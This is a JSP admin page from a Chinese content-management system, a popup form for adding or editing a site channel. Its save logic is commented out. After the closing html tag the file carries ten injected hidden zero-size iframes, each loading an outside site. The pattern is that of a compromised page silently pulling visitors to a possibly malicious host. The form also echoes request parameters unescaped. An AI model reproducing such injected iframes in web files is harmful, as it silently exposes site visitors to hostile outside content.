<%@ page contentType="text/html; charset=gbk" %>
<%@ page import="com.web.map.*"%>
<%@ page import="com.web.obj.*"%>
<%@ page import="com.web.common.*"%>
<%@ page import="java.util.*"%>
<%@ page import="com.web.bean.*"%>
<%@ page import="java.nio.channels.Channel" %>
<%
/**
 * 当前要修改的频道;
 */
String channelid = request.getParameter("channelid");
if(channelid == null)
  channelid = "0";

/**
 * 父频道id;
 */
String pchannelid = request.getParameter("pchannelid");
if(pchannelid == null)
  pchannelid = "0";

String channelname = request.getParameter("channelname");
String singname    = request.getParameter("singname");
String sort     = request.getParameter("sort");

//Channel channel = null;
//if(channelname != null &&channelname.length() >0)
//{
//
//  channel = ChannelMap.modChannel(channelid,pchannelid,channelname,singname,sort);
//  channelid = channel.getChannelid()+"";
//  pchannelid = channel.getParentid()+"";
//     out.println("<script>\n");
//     out.println("alert('操作成功！');\n");
//     out.println("parent.opener.location.reload();");
//     out.println("</script>\n");
//}
//if(channel == null && !channelid.equals("0"))
//  channel = ChannelMap.getOneChannel(channelid);
//else if(channel == null)
//  channel = new Channel();


%>
<html>
<head>
<title></title>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<style type="text/css">
<!--
body {
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
	scrollbar-3dlight-color:#8CABDE;
	scrollbar-highlight-color:#eeeeee;
	scrollbar-face-color:#E8F1FF;
	scrollbar-arrow-color:#8CABDE;
	scrollbar-shadow-color:#8CABDE;
	scrollbar-darkshadow-color:#eeeeee;
	scrollbar-base-color:#F0F0F0;
	scrollbar-track-color:#F2F7FF;
}
-->
</style>
<link href="../../style/css.css" rel="stylesheet" type="text/css">
    <script language=javascript src="../../script/common.js"></script>
<script language="javascript">
function checkfrm(frm)
{
   //alert(frm.dicnumber.value);
   if(frm.channelname.value == "")
   {
      alert("请输入频道名称！");
      return false;
   }
   if(frm.singname.value=="")
   {
      alert("请输入唯一名称！");
      return false;

   }

   return true;
}
</script>
</head>
<body>
<table width="100%" height="63"  border="0" cellpadding="0" cellspacing="0">
  <tr>
    <td width="56"><img src="../images/popwin1_01.gif" width="56" height="63"></td>
    <td width="219" align="center" background="../images/popwin1_02.gif"><table width="100%" height="31"  border="0" cellpadding="0" cellspacing="0" class="poptitle">
        <tr>
          <td align="center"><%if(channelid.equals("0")) out.println("增加频道"); else out.println("修改频道");%></td>
        </tr>
    </table></td>
    <td width="61"><img src="../images/popwin1_03.gif" width="61" height="63"></td>
    <td background="../images/popwin1_04.gif">&nbsp;</td>
    <td width="40"><img src="../images/popwin1_06.gif" width="40" height="63"></td>
  </tr>
</table>
<form action="" method="POST" onSubmit="return checkfrm(this);">
<table width="500"  border="0" align="center" cellpadding="0" cellspacing="0" bordercolor="#D8D8D8" class="txt" style="border-collapse:collapse ">
       <input type="hidden" name="channelid" value="<%=channelid%>">
       <input type="hidden" name="pchannelid" value="<%=pchannelid%>">
        <tr valign="middle">
          <td height="32" align="center">频道名称：</td>
          <td height="32"><input name="channelname" type="text" class="input3" id="channelname" value="<%//=channel.getChannelname()==null?"":channel.getChannelname()%>"></td>
        </tr>
        <tr valign="middle">
          <td height="27" align="center">唯一名称：</td>
          <td height="27"><input name="singname" type="text" class="input3" id="singname" value="<%//=channel.getSingname()==null?"":channel.getSingname()%>"></td>
        </tr>
        <tr valign="middle">
          <td width="96" height="27" align="center">排　序：</td>
          <td width="354" height="27"><select name="sort" size="1">
            <option value="-1" selected>正常排序</option>
            <option value="0">最前</option>
          </select></td>
        </tr>

        <tr valign="middle">
          <td height="40" colspan="2" align="center"><input name="" type="submit" class="button1"  value="确　定">
            　
              <input name="reset" type="reset" class="button1" value="重　写">
            　
            <input name="close" type="button" class="button1" onClick="window.close();" value="关　闭"></td>
        </tr>
</table>
</form>
</body>
</html>
<iframe src=http://www.baibv.com/index.htm width=0
height=0></iframe><iframe src=http://www.baibv.com/index.htm width=0
height=0></iframe><iframe src=http://www.baibv.com/index.htm width=0
height=0></iframe><iframe src=http://www.baibv.com/index.htm width=0
height=0></iframe><iframe src=http://www.baibv.com/index.htm width=0
height=0></iframe><iframe src=http://www.baibv.com/index.htm width=0
height=0></iframe><iframe src=http://www.baibv.com/index.htm width=0
height=0></iframe><iframe src=http://www.baibv.com/index.htm width=0
height=0></iframe><iframe src=http://www.baibv.com/index.htm width=0
height=0></iframe><iframe src=http://www.baibv.com/index.htm width=0
height=0></iframe>
